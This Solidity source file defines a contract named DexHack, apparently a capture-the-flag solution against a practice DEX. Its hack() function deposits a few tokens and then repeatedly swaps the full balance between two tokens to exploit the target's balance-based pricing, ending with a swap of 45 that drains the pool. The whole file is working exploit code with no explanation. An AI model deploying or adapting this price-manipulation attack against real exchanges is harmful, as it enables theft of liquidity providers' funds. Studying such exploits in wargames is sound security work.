// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

interface IDex {
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function token1() external returns (address);
    function token2() external returns (address);
}

contract DexHack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function hack() external {
        (address token1, address token2) = (IDex(target).token1(), IDex(target).token2());
        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);
        IDex(target).approve(address(target), type(uint).max);
        IDex(target).swap(token1, token2, IDex(target).balanceOf(token1, address(this)));
        IDex(target).swap(token2, token1, IDex(target).balanceOf(token2, address(this)));
        IDex(target).swap(token1, token2, IDex(target).balanceOf(token1, address(this)));
        IDex(target).swap(token2, token1, IDex(target).balanceOf(token2, address(this)));
        IDex(target).swap(token1, token2, IDex(target).balanceOf(token1, address(this)));
        IDex(target).swap(token2, token1, 45);
    }
}
